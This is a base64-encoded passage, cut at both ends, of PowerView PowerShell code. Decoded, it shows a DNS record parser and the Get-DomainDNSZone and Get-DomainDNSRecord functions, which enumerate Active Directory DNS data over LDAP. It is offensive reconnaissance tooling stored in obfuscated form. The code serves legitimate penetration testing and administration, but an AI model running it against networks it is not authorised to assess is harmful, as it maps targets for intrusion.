AtWWVhciAxNjAxIC1Nb250aCAxIC1EYXkgMSAtSG91ciAwIC1NaW51dGUgMCAtU2Vjb25kIDApLkFkZEhvdXJzKCRhZ2UpKS5Ub1N0cmluZygpCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkVGltZVN0YW1wID0gJ1tzdGF0aWNdJwogICAgICAgIH0KCiAgICAgICAgJEROU1JlY29yZE9iamVjdCA9IE5ldy1PYmplY3QgUFNPYmplY3QKCiAgICAgICAgaWYgKCRSRGF0YVR5cGUgLWVxIDEpIHsKICAgICAgICAgICAgJElQID0gInswfS57MX0uezJ9LnszfSIgLWYgJEROU1JlY29yZFsyNF0sICRETlNSZWNvcmRbMjVdLCAkRE5TUmVjb3JkWzI2XSwgJEROU1JlY29yZFsyN10KICAgICAgICAgICAgJERhdGEgPSAkSVAKICAgICAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdSZWNvcmRUeXBlJyAnQScKICAgICAgICB9CgogICAgICAgIGVsc2VpZiAoJFJEYXRhVHlwZSAtZXEgMikgewogICAgICAgICAgICAkTlNOYW1lID0gR2V0LU5hbWUgJEROU1JlY29yZFsyNC4uJEROU1JlY29yZC5sZW5ndGhdCiAgICAgICAgICAgICREYXRhID0gJE5TTmFtZQogICAgICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1JlY29yZFR5cGUnICdOUycKICAgICAgICB9CgogICAgICAgIGVsc2VpZiAoJFJEYXRhVHlwZSAtZXEgNSkgewogICAgICAgICAgICAkQWxpYXMgPSBHZXQtTmFtZSAkRE5TUmVjb3JkWzI0Li4kRE5TUmVjb3JkLmxlbmd0aF0KICAgICAgICAgICAgJERhdGEgPSAkQWxpYXMKICAgICAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdSZWNvcmRUeXBlJyAnQ05BTUUnCiAgICAgICAgfQoKICAgICAgICBlbHNlaWYgKCRSRGF0YVR5cGUgLWVxIDYpIHsKICAgICAgICAgICAgIyBUT0RPOiBob3cgdG8gaW1wbGVtZW50IHByb3Blcmx5PyBuZXN0ZWQgb2JqZWN0PwogICAgICAgICAgICAkRGF0YSA9ICQoW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEROU1JlY29yZFsyNC4uJEROU1JlY29yZC5sZW5ndGhdKSkKICAgICAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdSZWNvcmRUeXBlJyAnU09BJwogICAgICAgIH0KCiAgICAgICAgZWxzZWlmICgkUkRhdGFUeXBlIC1lcSAxMikgewogICAgICAgICAgICAkUHRyID0gR2V0LU5hbWUgJEROU1JlY29yZFsyNC4uJEROU1JlY29yZC5sZW5ndGhdCiAgICAgICAgICAgICREYXRhID0gJFB0cgogICAgICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1JlY29yZFR5cGUnICdQVFInCiAgICAgICAgfQoKICAgICAgICBlbHNlaWYgKCRSRGF0YVR5cGUgLWVxIDEzKSB7CiAgICAgICAgICAgICMgVE9ETzogaG93IHRvIGltcGxlbWVudCBwcm9wZXJseT8gbmVzdGVkIG9iamVjdD8KICAgICAgICAgICAgJERhdGEgPSAkKFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRETlNSZWNvcmRbMjQuLiRETlNSZWNvcmQubGVuZ3RoXSkpCiAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ0hJTkZPJwogICAgICAgIH0KCiAgICAgICAgZWxzZWlmICgkUkRhdGFUeXBlIC1lcSAxNSkgewogICAgICAgICAgICAjIFRPRE86IGhvdyB0byBpbXBsZW1lbnQgcHJvcGVybHk/IG5lc3RlZCBvYmplY3Q/CiAgICAgICAgICAgICREYXRhID0gJChbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkRE5TUmVjb3JkWzI0Li4kRE5TUmVjb3JkLmxlbmd0aF0pKQogICAgICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1JlY29yZFR5cGUnICdNWCcKICAgICAgICB9CgogICAgICAgIGVsc2VpZiAoJFJEYXRhVHlwZSAtZXEgMTYpIHsKICAgICAgICAgICAgW3N0cmluZ10kVFhUICA9ICcnCiAgICAgICAgICAgIFtpbnRdJFNlZ21lbnRMZW5ndGggPSAkRE5TUmVjb3JkWzI0XQogICAgICAgICAgICAkSW5kZXggPSAyNQoKICAgICAgICAgICAgd2hpbGUgKCRTZWdtZW50TGVuZ3RoLS0gLWd0IDApIHsKICAgICAgICAgICAgICAgICRUWFQgKz0gW2NoYXJdJEROU1JlY29yZFskaW5kZXgrK10KICAgICAgICAgICAgfQoKICAgICAgICAgICAgJERhdGEgPSAkVFhUCiAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ1RYVCcKICAgICAgICB9CgogICAgICAgIGVsc2VpZiAoJFJEYXRhVHlwZSAtZXEgMjgpIHsKICAgICAgICAgICAgIyBUT0RPOiBob3cgdG8gaW1wbGVtZW50IHByb3Blcmx5PyBuZXN0ZWQgb2JqZWN0PwogICAgICAgICAgICAkRGF0YSA9ICQoW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEROU1JlY29yZFsyNC4uJEROU1JlY29yZC5sZW5ndGhdKSkKICAgICAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdSZWNvcmRUeXBlJyAnQUFBQScKICAgICAgICB9CgogICAgICAgIGVsc2VpZiAoJFJEYXRhVHlwZSAtZXEgMzMpIHsKICAgICAgICAgICAgIyBUT0RPOiBob3cgdG8gaW1wbGVtZW50IHByb3Blcmx5PyBuZXN0ZWQgb2JqZWN0PwogICAgICAgICAgICAkRGF0YSA9ICQoW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEROU1JlY29yZFsyNC4uJEROU1JlY29yZC5sZW5ndGhdKSkKICAgICAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdSZWNvcmRUeXBlJyAnU1JWJwogICAgICAgIH0KCiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICREYXRhID0gJChbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkRE5TUmVjb3JkWzI0Li4kRE5TUmVjb3JkLmxlbmd0aF0pKQogICAgICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1JlY29yZFR5cGUnICdVTktOT1dOJwogICAgICAgIH0KCiAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVcGRhdGVkQXRTZXJpYWwnICRVcGRhdGVkQXRTZXJpYWwKICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RUTCcgJFRUTAogICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQWdlJyAkQWdlCiAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUaW1lU3RhbXAnICRUaW1lU3RhbXAKICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0RhdGEnICREYXRhCiAgICAgICAgJEROU1JlY29yZE9iamVjdAogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpbkROU1pvbmUgewo8IwouU1lOT1BTSVMKCkVudW1lcmF0ZXMgdGhlIEFjdGl2ZSBEaXJlY3RvcnkgRE5TIHpvbmVzIGZvciBhIGdpdmVuIGRvbWFpbi4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpblNlYXJjaGVyLCBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAgCgouUEFSQU1FVEVSIERvbWFpbgoKVGhlIGRvbWFpbiB0byBxdWVyeSBmb3Igem9uZXMsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvIGZvciB0aGUgc2VhcmNoLgoKLlBBUkFNRVRFUiBQcm9wZXJ0aWVzCgpTcGVjaWZpZXMgdGhlIHByb3BlcnRpZXMgb2YgdGhlIG91dHB1dCBvYmplY3QgdG8gcmV0cmlldmUgZnJvbSB0aGUgc2VydmVyLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBGaW5kT25lCgpPbmx5IHJldHVybiBvbmUgcmVzdWx0IG9iamVjdC4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluRE5TWm9uZQoKUmV0cmlldmVzIHRoZSBETlMgem9uZXMgZm9yIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluRE5TWm9uZSAtRG9tYWluIGRldi50ZXN0bGFiLmxvY2FsIC1TZXJ2ZXIgcHJpbWFyeS50ZXN0bGFiLmxvY2FsCgpSZXRyaWV2ZXMgdGhlIEROUyB6b25lcyBmb3IgdGhlIGRldi50ZXN0bGFiLmxvY2FsIGRvbWFpbiwgYmluZGluZyB0byBwcmltYXJ5LnRlc3RsYWIubG9jYWwuCgouT1VUUFVUUwoKUG93ZXJWaWV3LkROU1pvbmUKCk91dHB1dHMgY3VzdG9tIFBTT2JqZWN0cyB3aXRoIGRldGFpbGVkIGluZm9ybWF0aW9uIGFib3V0IHRoZSBETlMgem9uZS4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5ETlNab25lJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW0FsaWFzKCdSZXR1cm5PbmUnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRGaW5kT25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBQUk9DRVNTIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnTERBUEZpbHRlcicgPSAnKG9iamVjdENsYXNzPWRuc1pvbmUpJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRQcm9wZXJ0aWVzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkRE5TU2VhcmNoZXIxID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwoKICAgICAgICBpZiAoJEROU1NlYXJjaGVyMSkgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGaW5kT25lJ10pIHsgJFJlc3VsdHMgPSAkRE5TU2VhcmNoZXIxLkZpbmRPbmUoKSAgfQogICAgICAgICAgICBlbHNlIHsgJFJlc3VsdHMgPSAkRE5TU2VhcmNoZXIxLkZpbmRBbGwoKSB9CiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkT3V0ID0gQ29udmVydC1MREFQUHJvcGVydHkgLVByb3BlcnRpZXMgJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdab25lTmFtZScgJE91dC5uYW1lCiAgICAgICAgICAgICAgICAkT3V0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5ETlNab25lJykKICAgICAgICAgICAgICAgICRPdXQKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluREZTU2hhcmVdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRETlNTZWFyY2hlcjEuZGlzcG9zZSgpCiAgICAgICAgfQoKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2VQcmVmaXgnXSA9ICdDTj1NaWNyb3NvZnRETlMsREM9RG9tYWluRG5zWm9uZXMnCiAgICAgICAgJEROU1NlYXJjaGVyMiA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKCiAgICAgICAgaWYgKCRETlNTZWFyY2hlcjIpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZpbmRPbmUnXSkgeyAkUmVzdWx0cyA9ICRETlNTZWFyY2hlcjIuRmluZE9uZSgpIH0KICAgICAgICAgICAgICAgIGVsc2UgeyAkUmVzdWx0cyA9ICRETlNTZWFyY2hlcjIuRmluZEFsbCgpIH0KICAgICAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJE91dCA9IENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1pvbmVOYW1lJyAkT3V0Lm5hbWUKICAgICAgICAgICAgICAgICAgICAkT3V0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5ETlNab25lJykKICAgICAgICAgICAgICAgICAgICAkT3V0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdHMpIHsKICAgICAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5ETlNab25lXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiAkXyIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5ETlNab25lXSBFcnJvciBhY2Nlc3NpbmcgJ0NOPU1pY3Jvc29mdEROUyxEQz1Eb21haW5EbnNab25lcyciCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJEROU1NlYXJjaGVyMi5kaXNwb3NlKCkKICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluRE5TUmVjb3JkIHsKPCMKLlNZTk9QU0lTCgpFbnVtZXJhdGVzIHRoZSBBY3RpdmUgRGlyZWN0b3J5IEROUyByZWNvcmRzIGZvciBhIGdpdmVuIHpvbmUuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5TZWFyY2hlciwgQ29udmVydC1MREFQUHJvcGVydHksIENvbnZlcnQtRE5TUmVjb3JkICAKCi5ERVNDUklQVElPTgoKR2l2ZW4gYSBzcGVjaWZpYyBBY3RpdmUgRGlyZWN0b3J5IEROUyB6b25lIG5hbWUsIHF1ZXJ5IGZvciBhbGwgJ2Ruc05vZGUnCkxEQVAgZW50cmllcyB1c2luZyB0aGF0IHpvbmUgYXMgdGhlIHNlYXJjaCBiYXNlLiBSZXR1cm4gYWxsIEROUyBlbnRyeSByZXN1bHRzCmFuZCB1c2UgQ29udmVydC1ETlNSZWNvcmQgdG8gdHJ5IHRvIGNvbnZlcnQgdGhlIGJpbmFyeSBETlMgcmVjb3JkIGJsb2JzLgoKLlBBUkFNRVRFUiBab25lTmFtZQoKU3BlY2lmaWVzIHRoZSB6b25lIHRvIHF1ZXJ5IGZvciByZWNvcmRzICh3aGljaCBjYW4gYmUgZW51bWVhcnRlZCB3aXRoIEdldC1Eb21haW5ETlNab25lKS4KCi5QQVJBTUVURVIgRG9tYWluCgpUaGUgZG9tYWluIHRvIHF1ZXJ5IGZvciB6b25lcywgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8gZm9yIHRoZSBzZWFyY2guCgouUEFSQU1FVEVSIFByb3BlcnRpZXMKClNwZWNpZmllcyB0aGUgcHJvcGVydGllcyBvZiB0aGUgb3V0cHV0IG9iamVjdCB0byByZXRyaWV2ZSBmcm9tIHRoZSBzZXJ2ZXIuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIEZpbmRPbmUKCk9ubHkgcmV0dXJuIG9uZSByZXN1bHQgb2JqZWN0LgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5ETlNSZWNvcmQgLVpvbmVOYW1lIHRlc3RsYWIubG9jYWwKClJldHJpZXZlIGFsbCByZWNvcmRzIGZvciB0aGUgdGVzdGxhYi5sb2NhbCB6b25lLgoKLkVYQU1QTEUKCkdldC1Eb21haW5ETlNab25lIHwgR2V0LURvbWFpbkROU1JlY29yZAoKUmV0cmlldmUgYWxsIHJlY29yZHMgZm9yIGFsbCB6b25lcyBpbiB0aGUgY3VycmVudCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbkROU1pvbmUgLURvbWFpbiBkZXYudGVzdGxhYi5sb2NhbCB8IEdldC1Eb21haW5ETlNSZWNvcmQgLURvbWFpbiBkZXYudGVzdGxhYi5sb2NhbAoKUmV0cmlldmUgYWxsIHJlY29yZHMgZm9yIGFsbCB6b25lcyBpbiB0aGUgZGV2LnRlc3RsYWIubG9jYWwgZG9tYWluLgoKLk9VVFBVVFMKClBvd2VyVmlldy5ETlNSZWNvcmQKCk91dHB1dHMgY3VzdG9tIFBTT2JqZWN0cyB3aXRoIGRldGFpbGVkIGluZm9ybWF0aW9uIGFib3V0IHRoZSBETlMgcmVjb3JkIGVudHJ5LgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkROU1JlY29yZCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCAgTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRab25lTmFtZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcyA9ICduYW1lLGRpc3Rpbmd1aXNoZWRuYW1lLGRuc3JlY29yZCx3aGVuY3JlYXRlZCx3aGVuY2hhbmdlZCcsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW0FsaWFzKCdSZXR1cm5PbmUnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRGaW5kT25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBQUk9DRVNTIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnTERBUEZpbHRlcicgPSAnKG9iamVjdENsYXNzPWRuc05vZGUpJwogICAgICAgICAgICAnU2VhcmNoQmFzZVByZWZpeCcgPSAiREM9JCgkWm9uZU5hbWUpLENOPU1pY3Jvc29mdEROUyxEQz1Eb21haW5EbnNab25lcyIKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkUHJvcGVydGllcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJEROU1NlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwoKICAgICAgICBpZiAoJEROU1NlYXJjaGVyKSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZpbmRPbmUnXSkgeyAkUmVzdWx0cyA9ICRETlNTZWFyY2hlci5GaW5kT25lKCkgfQogICAgICAgICAgICBlbHNlIHsgJFJlc3VsdHMgPSAkRE5TU2VhcmNoZXIuRmluZEFsbCgpIH0KICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJE91dCA9IENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRfLlByb3BlcnRpZXMgfCBTZWxlY3QtT2JqZWN0IG5hbWUsZGlzdG